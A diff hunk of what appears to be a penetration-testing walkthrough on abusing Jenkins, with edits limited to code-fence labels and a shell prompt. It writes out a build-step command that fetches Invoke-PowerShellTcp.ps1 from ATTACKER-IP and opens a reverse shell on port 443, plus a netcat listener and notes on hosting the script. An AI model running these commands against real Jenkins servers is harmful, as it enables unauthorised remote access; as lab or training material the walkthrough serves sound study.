@@ -105,14 +105,14 @@ println "out> $sout err> $serr"
 - Add a build step, Navigate to `/job/Project0/configure` (If you get a `403` keep changing Project0 to Project1, Pro...2, ..........3 till you get a `200`)
 - Scroll down to the option "**Build steps**" and on the drop down select/add "**Execute Windows Batch Command**" and enter-:
 
-```
+```powershell
 powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ATTACKER-IP -Port 443
 ```
 
 - Now we can go ahead and start up a listener with netcat using the `netcat.exe` version to listen on the specified port
 
 ```bat
-$ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
 ```
 
 - Also we need to host our `Invoke-PowerShellTcp.ps1` script as stated in the payload, we can use a tool called **HTTP File Server (HFS)** or just try to google what works for you (Drag and drop the `Invoke-PowerShellTcp.ps1` to the left pane )
